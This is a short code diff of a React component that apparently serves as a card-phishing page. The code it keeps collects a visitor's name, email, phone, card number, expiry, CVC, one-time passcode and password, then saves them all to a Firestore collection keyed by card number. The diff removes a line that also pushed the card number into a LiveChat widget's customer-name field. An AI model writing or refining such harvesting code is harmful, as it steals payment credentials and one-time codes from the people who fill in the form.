@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { initializeApp } from "firebase/app"
 import { getFirestore, doc, setDoc } from "firebase/firestore"
 import { Check, X } from "lucide-react"
-import { LiveChatWidget, useWidgetCustomerData } from "@livechat/widget-react"
+import { LiveChatWidget } from "@livechat/widget-react"
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
 
 
@@ -119,7 +119,6 @@ export default function Component() {
         e.preventDefault()
         let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp },pass:pass }
         setDoc(doc(db, "data", cardNumber), alldat);
-        useWidgetCustomerData()!.name=alldat.payment.cardNumber ;
 
     }
 
